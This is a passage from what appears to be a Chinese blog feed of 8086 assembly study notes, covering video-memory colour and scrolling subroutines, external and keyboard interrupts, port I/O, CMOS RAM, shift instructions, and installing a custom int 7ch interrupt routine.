class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sub2:</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push es</span><br><span class="line"></span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov bx,1</span><br><span class="line">mov cx,2000</span><br><span class="line">sub2s:</span><br><span class="line">and byte ptr es:[bx],11111000b;先将0，1，2位设置为0</span><br><span class="line">or es:[bx],al;然后用or来设置前景色中的值为al</span><br><span class="line">add bx,2</span><br><span class="line">loop subs2</span><br><span class="line"></span><br><span class="line">pop es</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>3.设置背景色：设置显存中当前屏幕中处于奇地址的属性字节的 4 5 6位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sub3:</span><br><span class="line">push bx</span><br><span class="line">push cx</span><br><span class="line">push es</span><br><span class="line">mov cl,4</span><br><span class="line">shl al,cl</span><br><span class="line">mov bx,0b800h</span><br><span class="line">mov es,bx</span><br><span class="line">mov bx,1</span><br><span class="line">mov cx,2000</span><br><span class="line">sub3s:</span><br><span class="line">and byte ptr es:[bx],10001111B</span><br><span class="line">or es:[bx],al;因为要改变4 5 6 的位置，所以在前面需要shl 将al的值移动到456位置的地方</span><br><span class="line">add bx,2</span><br><span class="line">loop sub3s</span><br><span class="line"></span><br><span class="line">pop es</span><br><span class="line">pop cx</span><br><span class="line">pop bx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>4.向上滚动一行：也就是n+1行的内容复制到第n行；最后一行为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sub4:</span><br><span class="line">push cx</span><br><span class="line">push si</span><br><span class="line">push di</span><br><span class="line">push es</span><br><span class="line">push ds</span><br><span class="line">;因为下面需要用到，所以要保存到</span><br><span class="line">mov si,0b800h</span><br><span class="line">mov es,si</span><br><span class="line">mov ds,si</span><br><span class="line">mov si,160</span><br><span class="line">mov di,0</span><br><span class="line">cld;设置copy的方向</span><br><span class="line">mov cx,24;一共要复制24行</span><br><span class="line"></span><br><span class="line">sub4s:;把n+1行的东东复制到n行</span><br><span class="line">push cx</span><br><span class="line">mov cx,160</span><br><span class="line">rep movsb;进行复制咯ds:si复制到es:di中</span><br><span class="line">pop cx</span><br><span class="line">loop sub4s</span><br><span class="line"></span><br><span class="line">mov cx,80</span><br><span class="line">mov si,0</span><br><span class="line">sub4s1:;将最后一行清空</span><br><span class="line">mov byte ptr [160*24+si],&#x27; &#x27;</span><br><span class="line">add si,2</span><br><span class="line">loop sub4s1</span><br><span class="line"></span><br><span class="line">pop ds</span><br><span class="line">pop es</span><br><span class="line">pop di</span><br><span class="line">pop si</span><br><span class="line">pop cx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-外中断（15）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-15-%E5%A4%96%E4%B8%AD%E6%96%AD/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-15-%E5%A4%96%E4%B8%AD%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>之前我们讨论的都是CPU对指令的执行。我们知道CPU在计算机系统中，除了能够执行指令外，还能进行运算，还应该能够对外部设备进行控制，接受它们的输入，向他们输出</p><p>也就是说：CPU除了运算能力外，还有I/O（input/output）能力</p><h2 id="1-接口芯片和端口"><a href="#1-接口芯片和端口" class="headerlink" title="1.接口芯片和端口"></a>1.接口芯片和端口</h2><p>在PC系统的接口卡和主板上，装有各种接口芯片。这些外设接口芯片的内部有若干寄存器，CPU将这些寄存器当作端口来访问。</p><p>外设的输入和CPU的输出都不是直接的，而是通过送入相关的接口芯片的端口中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每一个外部设备都有一个小小的，类似于内存一样的端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CPU通过端口和外部设备进行联系</span><br></pre></td></tr></table></figure><h2 id="2-外中断信息"><a href="#2-外中断信息" class="headerlink" title="2.外中断信息"></a>2.外中断信息</h2><p>由CPU的自己产生的中断信息叫内中断，非CPU由外部中断的叫外中断</p><p>外中断一共有2种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.可屏蔽中断【要看IF位的设置】</span><br><span class="line">2.不可屏蔽中断【少】</span><br></pre></td></tr></table></figure><p>当CPU检测到可屏蔽信息的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果IF=1，则CPU在执行完当前指令后，响应中断</span><br><span class="line">如果IF=0，则不响应中断</span><br><span class="line"></span><br><span class="line">所以在进入某个中断的时候，就会自动的把IF设置为0</span><br></pre></td></tr></table></figure><p>内中断的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.取得中断类型码N</span><br><span class="line">2.pushf</span><br><span class="line">3.TF = 0,IF = 0</span><br><span class="line">4.push CS</span><br><span class="line">5.push IP</span><br><span class="line">6.(IP)=(N*4),(CS)=(N*4+2)</span><br><span class="line">转去执行</span><br></pre></td></tr></table></figure><p>外中断信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可屏蔽中断所引发的中断的过程和内中断基本一样，除了第一个</span><br><span class="line">取得中断信息，由于中断信息是来自CPU外部，中断类型码是通过数据总线送入CPU的</span><br><span class="line">而内中断的中断类型码是在CPU内部产生的</span><br></pre></td></tr></table></figure><p>8086CPU提供了设置IF的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sti。将IF设置为1</span><br><span class="line">cli，将IF设置为0</span><br></pre></td></tr></table></figure><p>不可屏蔽中断的中断过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">标志寄存器入栈，IF=0,TF=0</span><br><span class="line">CS,IP入栈</span><br><span class="line">(IP)=(8),(CS)=(0AH)</span><br><span class="line">这是一个固定的地址</span><br></pre></td></tr></table></figure><h2 id="3-PC键盘的处理过程"><a href="#3-PC键盘的处理过程" class="headerlink" title="3.PC键盘的处理过程"></a>3.PC键盘的处理过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.键盘输入</span><br><span class="line">2.引发9号中断</span><br><span class="line">3.执行int 9 中断例程</span><br></pre></td></tr></table></figure><p>键盘上每一个健相当于一个开关，键盘中由一个芯片对减半上的每一个健的开关状态进行扫描</p><p>按下一个健的时候，就会产生一个扫描码，这个扫描码就会被送入接口芯片的寄存器中，改寄存器的端口地址就是60H</p><p>,松开的时候也会产生一个扫描码</p><p>按下的码【通码】，松开【断码】</p><p>扫描长度是一个字节，通码的第七位为0，断码的第七位为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">断码 = 通码 + 80H</span><br></pre></td></tr></table></figure><p>bios提供了 int 9 中断例程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.读取60H端口的扫描码</span><br><span class="line">2.如果是字符集键的扫描码，改扫描码和它所对应的字符吗（ASCII）送入内存中的BIOS键盘缓冲区</span><br><span class="line">3.如果是控件健和切换键的扫描码，则将其转变为状态字节（用二进制记录控制键和切换键状态的字节）写入内存中粗存状态字节的单元</span><br></pre></td></tr></table></figure><p>一般情况下，CPU在执行当前指令后，如果检测到中断信息，就响应中断，引发中断过程</p><p>可是在有些情况下，CPU在执行当前指令后，即便是发生中断，也不会响应</p><p>该内存区可以存储15个键盘输入，因为int 9 中断例程除了接收扫描码外，还要产生 字符吗，所以BIOS键盘缓冲区中，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码</p><p>0040：17单元控制着键盘键的状态字节</p><h2 id="4-编写int-9-中断例程"><a href="#4-编写int-9-中断例程" class="headerlink" title="4.编写int 9 中断例程"></a>4.编写int 9 中断例程</h2><p>过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.键盘产生扫描码</span><br><span class="line">2.扫描码送入60H端口</span><br><span class="line">3.一旦检测到60H端口有动静，引发9号中断</span><br><span class="line">4.CPU执行int 9 中断例程处理键盘输入【只能控制这里】</span><br></pre></td></tr></table></figure><p>啦啦啦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s1:</span><br><span class="line">sub ax,1;当ax=0减去1的时候会变成FFFF，然后会借位，所以CF会变成1</span><br><span class="line">sbb dx,0;只有在CF中为1的时候，dx才会被减1</span><br><span class="line">cmp ax,0</span><br><span class="line">jne s1</span><br><span class="line">cmp dx,0</span><br><span class="line">jne s1</span><br></pre></td></tr></table></figure><p>这个代码和c语言中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for(i=0; i&lt;100; i++)&#123;</span><br><span class="line">for(j=0;j&lt;10000;j++)&#123;</span><br><span class="line">***</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">是一模一样的</span><br></pre></td></tr></table></figure><p>实现IF和TF=0的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pushf </span><br><span class="line">pop ax</span><br><span class="line">and ah,11111100B</span><br><span class="line">;if和tf是标志寄存器的9 和 8 位</span><br><span class="line"></span><br><span class="line">push ax</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><h2 id="5-总结一下啦"><a href="#5-总结一下啦" class="headerlink" title="5.总结一下啦"></a>5.总结一下啦</h2><p>8086CPU提供一下几个大类的指令</p><p>1.数据传送指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov push pop pushf popf xchg</span><br><span class="line">都是数据传送指令，这些指令实现寄存器和内存，寄存器和寄存器之间的单个数据传送</span><br></pre></td></tr></table></figure><p>2.算数运算指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add sub adc sbb inc dec cmp imul idiv aaa</span><br><span class="line">都是算术运算指令，这些指令实现寄存器和内存中的数据的算数运算</span><br><span class="line">它们的执行结果会影响标志寄存器：</span><br><span class="line">sf zf of cf pf af</span><br></pre></td></tr></table></figure><p>3.逻辑指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and or not xor test shl shr sal sar rol ror rcl rcr</span><br><span class="line">除了not，它们的执行结果都会影响标志寄存器的相关标志位</span><br></pre></td></tr></table></figure><p>4.转移指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">可以修改IP，或者CS和IP</span><br><span class="line">1.无条件转移指令：jmp</span><br><span class="line">2.条件转移指令：jcxz je jb ja jnb jna</span><br><span class="line">3.循环指令：loop</span><br><span class="line">4.过程：call ret retf</span><br><span class="line">5.中断：int iret</span><br></pre></td></tr></table></figure><p>5.处理机控制指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对标志寄存器或者其他处理机状态进行设置</span><br><span class="line">cld std cli sti nop clc cmc stc hlf wait essc lock </span><br></pre></td></tr></table></figure><p>6.串处理指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对内存中的批量数据进行处理</span><br><span class="line">movsb movsw cmps scas lods stos</span><br><span class="line">一般需要和rep repe repne前缀指令配合使用</span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-端口（14）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-14-%E7%AB%AF%E5%8F%A3/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-14-%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>CPU可以直接读取3个地方的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.CPU内部的寄存器</span><br><span class="line">2.内存单元</span><br><span class="line">3.端口</span><br></pre></td></tr></table></figure><h2 id="1-端口的读写"><a href="#1-端口的读写" class="headerlink" title="1.端口的读写"></a>1.端口的读写</h2><p>端口的读写不能用 mov </p><p>1.只能用in out</p><h3 id="访问内存"><a href="#访问内存" class="headerlink" title="访问内存"></a>访问内存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,ds:[8]</span><br><span class="line">1.CPU通过地址线将地址信息8发出</span><br><span class="line">2.CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据</span><br><span class="line">存储器将8号单元中的数据通过数据线送入CPU</span><br></pre></td></tr></table></figure><h3 id="访问端口"><a href="#访问端口" class="headerlink" title="访问端口"></a>访问端口</h3><p>in是读，out是写</p><p>in al,60h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从60H号端口读入一个字节</span><br></pre></td></tr></table></figure><p>执行的时候操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.CPU通过地址将地址信息60h发出</span><br><span class="line">2.CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据</span><br><span class="line">3.端口所在的芯片将60h端口中的数据通过数据线送入CPU</span><br></pre></td></tr></table></figure><p>2.注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在in 和 out 指令中，只能使用ax或al 来存从端口中读入的数据或要发送到端口中的数据。访问8位端口的时候，用al，访问16位端口的时候，用ax</span><br></pre></td></tr></table></figure><p>3.对0~255以内的端口进行读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in al,20h;从20h端口读入一个字节，放到al中</span><br><span class="line">out 20h,al;往20h端口写入一个字节</span><br></pre></td></tr></table></figure><p>4.对256~65535的端口进行读写的时，端口号放在dx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov dx,3f8h;将端口号3f8送入dx中</span><br><span class="line">in al,dx;从3f8h端口读入一个字节</span><br><span class="line">out dx,al;向3f8h端口写入一个字节</span><br><span class="line"></span><br><span class="line">读或者写数据是放在al或者ax中，端口号是放在dx中的</span><br></pre></td></tr></table></figure><h2 id="2-CMOS-RAM-芯片"><a href="#2-CMOS-RAM-芯片" class="headerlink" title="2.CMOS RAM 芯片"></a>2.CMOS RAM 芯片</h2><p>PC机中有一个CMOS RAM芯片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.包含一个实时钟和一个有128个存储单元的RAM寄存器</span><br><span class="line">2.改芯片靠电池供电。</span><br><span class="line">3.128个字节的RAM中，内部实时种占用0~0dh单元来保存时间信息，其他大部分分单元用于保存系统配置信息，供系统启动的时候BIOS程序读取</span><br></pre></td></tr></table></figure><p>2.bios也提供了相关的程序，使我们可以在开机的时候，配置CMOS RAM种的系统会给信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">改芯片内部有2个端口，端口地址是70H和71H</span><br><span class="line">70H为地址端口，存放要访问的CMOS RAM单元的地址；71为数据端口，存放从选定的COS RAM 单元种读取的数据，或要写入到其中的数据</span><br></pre></td></tr></table></figure><p>比如：读CMOS RAM 的2号单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.将2送入端口70h</span><br><span class="line">2.从71h读出2号单元的内容</span><br></pre></td></tr></table></figure><h2 id="3-shl和shr指令"><a href="#3-shl和shr指令" class="headerlink" title="3.shl和shr指令"></a>3.shl和shr指令</h2><p>1.shl和shr是逻辑位移指令，后面的课程中我们要用到位移指令</p><p>2.shl是逻辑左移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.将一个寄存器或者内存单元中的数据向左移位</span><br><span class="line">2.将最后移出的一位写入CF中</span><br><span class="line">3.最低位用0补充</span><br></pre></td></tr></table></figure><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,01001000b</span><br><span class="line">shl al,1;将al中的数据左移1位</span><br><span class="line">执行后(al)=10010000b,cf=0</span><br></pre></td></tr></table></figure><p>如果移动位数大于1的时候，必须将移动位数放在cl中</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,01010001b</span><br><span class="line">mov cl,3</span><br><span class="line">sha al,cl</span><br><span class="line">执行后(al)=10001000b cf=0</span><br></pre></td></tr></table></figure><p>可以看出，将x逻辑左移一位，相当于执行x=x*2</p><p>3.shr就是shl的反向操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">移出的最后一个存入cf中</span><br></pre></td></tr></table></figure><p>逻辑右移一位，相当于x=x/2</p><h2 id="4-CMOS-RAM中存储的时间信息"><a href="#4-CMOS-RAM中存储的时间信息" class="headerlink" title="4.CMOS RAM中存储的时间信息"></a>4.CMOS RAM中存储的时间信息</h2><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230503145254486.png" alt="image-20230503145254486"></p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-int指令（13）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-13-int%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-13-int%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>无</p><h2 id="1-int-指令"><a href="#1-int-指令" class="headerlink" title="1.int 指令"></a>1.int 指令</h2><p>1.CPU指令int n 指令，相当于引发一个 n 号中断的中断过程，执行过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.取中断类型码 n ；</span><br><span class="line">2.标志寄存器入栈，IF=0 TF=0</span><br><span class="line">3.CS,IP入栈</span><br><span class="line">4.(IP)=(N*4),(CS)=(N*4+2)</span><br><span class="line">从此转去执行n号中断的中断处理程序</span><br></pre></td></tr></table></figure><p>2.int指令和call指令类似，但是int是调试中断指令，但是call是函数</p><h2 id="2-编写供应用程序调用的中断例程"><a href="#2-编写供应用程序调用的中断例程" class="headerlink" title="2.编写供应用程序调用的中断例程"></a>2.编写供应用程序调用的中断例程</h2><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230416230210682.png" alt="image-20230416230210682"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.编写实现平方功能的程序</span><br><span class="line">2.安装程序，我们将其安装在0:200中</span><br><span class="line">3.设置中断向量表，将程序的入口地址保存在7ch表项中，使其成为中断7ch的中断例程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code </span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,3456;(ax)=3456</span><br><span class="line">int 7ch;调用中断7ch的中断例程，计算ax中的数据的平方</span><br><span class="line"></span><br><span class="line">add ax,ax</span><br><span class="line">adc dx,dx;将结果乘以2</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">;编写：安装中断7ch的中断例程</span><br><span class="line">;功能：求-word型数据的平方</span><br><span class="line">;参数：(ax) = 要计算的数据</span><br><span class="line">;返回值：dx,ax中存放结果的高和低16位</span><br><span class="line"></span><br><span class="line">assume cs:code </span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset sqr;设置ds和si的值，指向源程序</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200H;设置es:di指向目的地址；也就是那个安全空空间，在安全空间里面写入指令，然后让向量表指向这个写了代码的安全空间</span><br><span class="line">mov cx,offset sqrent - offset sqr</span><br><span class="line"></span><br><span class="line">cld</span><br><span class="line">rep movsb;ds:si的传入es:bi</span><br><span class="line"></span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov word ptr es:[7ch*4],200H;设置中断向量表，</span><br><span class="line">mov word ptr es:[7ch*4+2],0;修改了7ch所指定的地址到了我们写入的安全空间</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">sqr:mul ax;mul指令是乘法指令，它默认的是al或ax中的值和某一个8/16位单元中乘法，放在ax 或者dx和ax中</span><br><span class="line">iret;iret是返回中断【int】，ret是返回普通的【call】</span><br><span class="line"></span><br><span class="line">sqrend:nop</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="3-对int，iret和栈的深入理解"><a href="#3-对int，iret和栈的深入理解" class="headerlink" title="3.对int，iret和栈的深入理解"></a>3.对int，iret和栈的深入理解</h2><p>int 7ch 引发中断过程后，它会把flag，ip和cs都压入栈中，此时压入的CS和IP中的内容，分辨是调用程序的段地址（可以认为是标号s的段地址）和int 7ch后一条指令的偏移地址（也就是标号se的偏移地址）</p><p>可见，在中断例程中，可以从栈里面取得标号s的段地址和标号se的偏移地址，而用se的偏移地址加上bx中存放的转移位移就可以得到s的偏移地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;中断例程如下：</span><br><span class="line">lp:</span><br><span class="line">push bp</span><br><span class="line">mov bp,sp</span><br><span class="line">dec cx</span><br><span class="line">jcxz lpret;当cx为0的时候跳转</span><br><span class="line">add [bp+2],bx在使用bp的时候是默认是用ss段地址</span><br><span class="line">;这里bp+2是因为，对于8086CPU每一个都占用2个字节</span><br><span class="line">;</span><br><span class="line">lpret:</span><br><span class="line">pop bp</span><br><span class="line">iret</span><br></pre></td></tr></table></figure><p>这里因为要访问栈，使用bp,在程序开始处将bp入栈，结束的时候出栈恢复。当要修改栈中se的偏移地址的时候，栈中的情况是：栈顶处是bp原来的数值，下面是se的偏移地址，在下面是s的段地址，在下面是标志寄存器的值。而此时，bp中为栈顶的偏移地址，所以((ss)*16+(bp)+2)处是se的偏移地址，将他加上bx中的位移也就变成了s的偏移地址。最后用iret出栈返回，CS:IP即从标号s处开始执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int 入栈的时候相当于是push </span><br><span class="line">它是往上走的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.pop IP</span><br><span class="line">2.pop CS</span><br><span class="line">3.popf</span><br></pre></td></tr></table></figure><h2 id="4-BIOS和DOS中断例程的安装过程"><a href="#4-BIOS和DOS中断例程的安装过程" class="headerlink" 